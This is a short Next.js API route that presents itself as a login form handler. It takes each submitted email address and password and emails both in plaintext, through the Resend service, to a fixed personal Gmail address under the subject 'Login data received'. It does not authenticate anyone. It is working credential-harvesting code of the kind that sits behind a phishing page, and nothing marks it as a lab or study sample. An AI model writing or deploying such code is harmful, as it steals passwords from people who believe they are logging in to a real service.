import { EmailTemplate } from "@/components/email-template";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: Request) {
  try {
    const dataForm = await req.json();
    
    try {
      const data = await resend.emails.send({
        from: "Login Form <onboarding@resend.dev>",
        to: ["rostran448@gmail.com"],
        subject: "Datos de Login Recibidos",
        react: await EmailTemplate({
          email: dataForm.email,
          password: dataForm.password
        }),
        text: `Email: ${dataForm.email}\nPassword: ${dataForm.password}`
      });
      
      return Response.json(data);
    } catch (error) {
      return Response.json({ error });
    }
  } catch (error) {
    return Response.json({ error });
  }
}